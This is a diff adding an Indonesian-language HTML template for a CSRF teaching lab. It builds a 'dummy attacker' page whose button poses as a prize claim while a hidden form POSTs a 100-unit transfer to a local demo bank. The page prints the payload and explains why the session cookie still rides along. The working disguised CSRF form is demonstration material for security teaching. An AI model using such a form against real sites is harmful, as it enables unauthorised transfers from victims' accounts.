@@ -1,0 +1,12 @@
+{% extends 'base.html' %}
+{% block title %}Penyerang dummy · CSRF{% endblock %}
+{% block body %}
+<section class="panel narrow"><p class="eyebrow">HALAMAN PENYERANG DUMMY / ORIGIN PORT 5100</p><h1>Hadiah untuk peserta lab</h1><p>Tombol di bawah menyamar sebagai klaim hadiah. Form sebenarnya mengirim 100 unit dari bank {{ mode }} di port 5104 ke penyerang-demo.</p><p>Buka <a href="{{ service_url(5104) }}/bank/{{ mode }}" target="_blank" rel="noopener">Bank {{ mode }}</a> dahulu untuk membuat sesi korban.</p>
+<form method="post" action="{{ service_url(5104) }}/bank/{{ mode }}/transfer" target="_blank"><input type="hidden" name="amount" value="100"><input type="hidden" name="recipient" value="penyerang-demo"><button class="button danger" type="submit">Klaim hadiah (kirim POST lintas origin)</button></form>
+<h2>Payload form yang dipakai</h2><pre class="trace">&lt;form method="post"
+      action="{{ service_url(5104) }}/bank/{{ mode }}/transfer"&gt;
+  &lt;input name="amount" value="100"&gt;
+  &lt;input name="recipient" value="penyerang-demo"&gt;
+  &lt;!-- Tidak ada token anti-CSRF --&gt;
+&lt;/form&gt;</pre><p>Port berbeda membuat kedua halaman berbeda <em>origin</em>. Cookie tidak dibatasi port dan kedua URL ini masih <em>same-site</em>, jadi cookie sesi bank dapat ikut terkirim.</p></section>
+{% endblock %}
